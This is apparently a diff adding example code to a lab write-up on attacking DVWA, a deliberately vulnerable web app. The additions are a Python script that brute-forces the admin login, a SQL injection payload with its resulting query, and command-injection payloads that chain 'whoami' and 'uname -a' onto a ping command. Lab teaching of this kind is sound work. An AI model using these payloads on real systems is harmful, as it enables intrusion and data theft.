@@ -41,14 +41,33 @@ The successful payload had a different response length, indicating the applicati
 Explanation:  
 DVWA does not implement account lockout, IP throttling, or delays between attempts. Any attacker can brute-force the login by monitoring response length, response time, or redirect behavior.
 
+Example code:  
+```
+import requests
+
+url = "http://192.168.56.103/dvwa/login.php"
+passwords = ["admin", "password", "123456"]
+
+for pw in passwords:
+    data = {
+        "username": "admin",
+        "password": pw,
+        "Login": "Login"
+    }
+    r = requests.post(url, data=data)
+    if "Login failed" not in r.text:
+        print(f"[+] Valid password found: {pw}")
+        break
+```
+
 ---
 
 ## Step 2 — SQL Injection
 
 Input tested:
-
+```
 1' OR '1'='1
-
+```
 Explanation:  
 DVWA concatenates the user input directly into the SQL statement:
 
@@ -59,22 +78,34 @@ Because the input contains additional SQL logic, the WHERE clause becomes perman
 Risk impact:  
 SQL injection enables attackers to retrieve, modify, or delete data, escalate privileges, or chain into RCE in certain database environments.
 
+Example code:  
+```
+SELECT first_name, last_name
+FROM users
+WHERE user_id = '1' OR '1'='1';
+```
+
 ---
 
 ## Step 3 — Command Injection
 
 Payloads tested:
-
+```
 8.8.8.8; whoami  
 8.8.8.8 | uname -a  
 8.8.8.8 | pwd
-
+```
 Explanation:  
 The app runs:
 
 ping -c 4 <user_input>
 
 Because characters like “;” and “|” terminate the ping command, anything after them runs as a separate shell command.
+
+```
+ping -c 4 8.8.8.8; whoami
+ping -c 4 8.8.8.8 | uname -a
+```
 
 Risk impact:  
 Command injection gives full OS-level access under the web server user account (www-data). Attackers can read files, download malware, pivot further, or escalate privileges.
